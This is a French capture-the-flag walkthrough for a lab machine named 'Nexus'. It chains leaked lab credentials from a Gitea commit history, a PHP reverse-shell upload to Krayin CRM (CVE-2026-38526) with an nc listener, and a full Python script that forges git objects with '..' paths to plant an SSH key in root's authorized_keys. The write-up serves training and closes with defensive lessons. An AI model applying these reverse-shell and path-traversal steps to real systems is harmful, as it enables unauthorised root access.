[⬅ Retour à Machines](README.md) · [🏠 Accueil du repo](../../README.md)

# Machine 3 — Nexus

**Gitea leak + Krayin CRM RCE (CVE-2026-38526) + Directory Traversal via os.path.join — Easy / Linux**

| | |
|---|---|
| **OS** | Linux |
| **Difficulté** | Easy |
| **Points** | 20 |
| **Services** | SSH (22) · HTTP/nginx (80) → Gitea + Krayin CRM |
| **Vulnérabilité principale** | Credential leak (Gitea) + CVE-2026-38526 (RCE) + directory traversal |

## Concept

Une instance Gitea expose un dépôt public contenant un fichier `.env` avec des credentials en clair (visibles dans l'historique des commits). Ces credentials donnent accès à un Krayin CRM vulnérable à un upload de fichier PHP arbitraire (CVE-2026-38526), permettant un RCE en tant que `www-data`. L'énumération des fichiers de configuration révèle des credentials SSH pour l'utilisateur `jones`. La privesc exploite un service de synchronisation de templates Gitea qui utilise `os.path.join()` sans sanitiser les chemins, permettant un directory traversal pour écrire une clé SSH publique dans `/root/.ssh/authorized_keys`.

```mermaid
flowchart LR
    A["nmap -sC -sV"] --> B["Port 80: nexus.htb\nPort 22: SSH"]
    B --> C["ffuf: subdomain\ngit.nexus.htb\nbilling.nexus.htb"]
    C --> D["Gitea: repo admin/krayin-docker-setup\n.env exposé + commit history"]
    D --> E["DB_PASSWORD=N27xh!!2UcY04\nj.matthew@nexus.htb"]
    E --> F["billing.nexus.htb\nKrayin CRM v2.2.0"]
    F --> G["CVE-2026-38526\nUpload PHP shell via email"]
    G --> H["RCE as www-data\n/var/www/krayin/.env"]
    H --> I["DB_PASSWORD=y27xb3ha!!74GbR\nSSH: jones@nexus.htb"]
    I --> J["systemctl list-timers\ngitea-template-sync.timer"]
    J --> K["build.py: git objects avec ..\ndirectory traversal"]
    K --> L["Clé SSH écrite dans\n/root/.ssh/authorized_keys"]
    L --> M["ssh -i /tmp/.k root@nexus.htb\n→ root flag"]
```

## Énumération

### Nmap

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.234.54 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.129.234.54
```

Ports ouverts : **22 (SSH)**, **80 (HTTP nginx)** → redirige vers `nexus.htb`.

```bash
echo "10.129.234.54 nexus.htb git.nexus.htb billing.nexus.htb" | sudo tee -a /etc/hosts
```

### Vhost fuzzing

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ \
     -u http://nexus.htb/ -H "Host: FUZZ.nexus.htb" -fw 4
```

Résultat : `git` (Gitea) et `billing` (Krayin CRM).

### Gitea — leak de credentials

Dans le dépôt `admin/krayin-docker-setup`, le fichier `.env` est exposé. L'historique des commits (commit `9b817fa4e0`) révèle :

```
DB_PASSWORD=N27xh!!2UcY04
```

La page Careers du site principal révèle l'email du hiring manager : `j.matthew@nexus.htb`.

---

## Foothold — Krayin CRM RCE (CVE-2026-38526)

Connexion sur `http://billing.nexus.htb` avec `j.matthew@nexus.htb` / `N27xh!!2UcY04`.  
Version détectée : **Krayin CRM 2.2.0**.

### Exploitation

1. Aller dans **Mail → Inbox → Compose Mail**
2. Joindre un reverse shell PHP (ex: `php-reverse-shell.php` de PentestMonkey)
3. Intercepter la requête avec Burp Suite
4. Renommer le fichier de `.png` en `.php` dans la requête
5. Envoyer la requête modifiée

```bash
# Listener sur Kali
nc -lnvp 4455
```

Visiter l'URL du fichier uploadé pour déclencher le reverse shell :
```
http://billing.nexus.htb/storage/tinymce/<hash>.php
```

Shell obtenu en tant que `www-data`.

```bash
script /dev/null -c /bin/bash
```

### Credentials SSH dans .env

```bash
cat /var/www/krayin/.env
# DB_PASSWORD=y27xb3ha!!74GbR
```

```bash
ssh jones@10.129.234.54
# Password: y27xb3ha!!74GbR
```

**User flag** : `/home/jones/user.txt`

---

## Privilege Escalation — Directory Traversal via os.path.join

### Découverte

```bash
systemctl list-timers
# gitea-template-sync.timer → toutes les ~1 minute
```

Le script `/etc/gitea/template-sync.py` clone tous les dépôts Gitea marqués comme **template** et synchronise leurs fichiers vers `/home/git/template-staging/<owner>/<repo>/` en utilisant `os.path.join()` **sans sanitiser les chemins** contenant `..`.

### Exploitation

#### 1. Générer une clé SSH

```bash
ssh-keygen -t ed25519 -f /tmp/.k -N ''
```

#### 2. Créer un repo template sur Gitea

Se connecter sur `http://git.nexus.htb` avec `jones` / `y27xb3ha!!74GbR`.  
Créer un repo `rce` et cocher **"Make repository a template"**.

#### 3. Cloner le repo

```bash
cd /tmp
git clone http://jones:'y27xb3ha!!74GbR'@127.0.0.1:3000/jones/rce.git
cd rce
touch README.md
```

#### 4. Script build.py — créer des objets git malveillants

```python
#!/usr/bin/env python3
import hashlib,zlib,os,subprocess,sys,time

def write_obj(data,t):
    h=("%s %d"%(t,len(data))).encode()+b"\x00"
    s=h+data
    sha=hashlib.sha1(s).hexdigest()
    d=os.path.join(".git","objects",sha[:2])
    os.makedirs(d,exist_ok=True)
    p=os.path.join(d,sha[2:])
    if not os.path.exists(p):
        open(p,"wb").write(zlib.compress(s))
    return sha

def entry(mode,name,sha):
    return("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)

if not os.path.isdir(".git"):
    print("Run inside git repo");sys.exit(1)

r=subprocess.run(["cat","/tmp/.k.pub"],capture_output=True,text=True)
key=r.stdout.strip()+"\n"
blob=write_obj(key.encode(),"blob")
readme=write_obj(b"# Template\n","blob")
ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")
cur=write_obj(entry("40000",".ssh",ssh_t),"tree")
fir=write_obj(entry("40000","root",cur),"tree")
for i in range(4):
    fir=write_obj(entry("40000","..",fir),"tree")
root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")
ts=int(time.time())
c="tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n"%(root,ts,ts)
sha=write_obj(c.encode(),"commit")
os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)
open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")
print("Done: "+sha)
```

```bash
python3 /tmp/build.py
git push -u origin main --force
```

#### 5. Attendre le timer et se connecter en root

```bash
# Surveiller le log
watch -n 5 cat /var/log/template-sync.log
# Attendre: synced: ../../../../../root/.ssh/authorized_keys
```

```bash
# Depuis Kali
ssh -i /tmp/.k root@10.129.234.54
cat /root/root.txt
```

**Root flag** : `/root/root.txt` ✅

---

## Résumé des credentials

| Service | Utilisateur | Mot de passe |
|---------|-------------|--------------|
| Krayin CRM | j.matthew@nexus.htb | N27xh!!2UcY04 |
| SSH (jones) | jones | y27xb3ha!!74GbR |
| SSH (root) | root | clé SSH `/tmp/.k` |

---

## Vulnérabilités exploitées

| CVE / Technique | Description |
|----------------|-------------|
| Credential leak (Gitea) | Mot de passe exposé dans l'historique des commits |
| CVE-2026-38526 | Krayin CRM 2.2.0 — upload de fichier PHP arbitraire |
| Unsanitized `os.path.join()` | Directory traversal via objets git malveillants |

## Points clés

- Un dépôt Gitea marqué privé n'empêche pas forcément l'accès à un sous-domaine `git.*` mal segmenté — toujours fuzzer les vhosts.
- Les credentials supprimés d'un fichier `.env` restent lisibles dans l'historique git (`git log -p`) tant que l'historique n'est pas réécrit.
- Une CVE de upload de fichier sur un CRM auto-hébergé (Krayin) peut être déclenchée via une fonctionnalité métier anodine (pièce jointe d'email).
- `os.path.join()` en Python **ne neutralise pas** les composants `..` : toute valeur provenant d'un objet git (nom de fichier, chemin d'arborescence) doit être validée avant d'être utilisée dans un chemin de destination.
- Un timer systemd (`systemctl list-timers`) qui synchronise du contenu externe (dépôts "template") est une surface de privesc à ne pas négliger lors de l'énumération post-foothold.

## Leçon retenue

*Une fuite de credentials dans un historique git, combinée à une CVE d'upload sur une application métier et à un service de synchronisation non sanitisé, forme une chaîne complète de la reconnaissance jusqu'à root. Vérifier systématiquement l'historique des commits sur tout dépôt exposé, même privé en apparence.*

---

[⬅ Précédent : Orion](orion.md) · [⬆ Index Machines](README.md) · [Suivant : Reactor ➡](reactor.md)
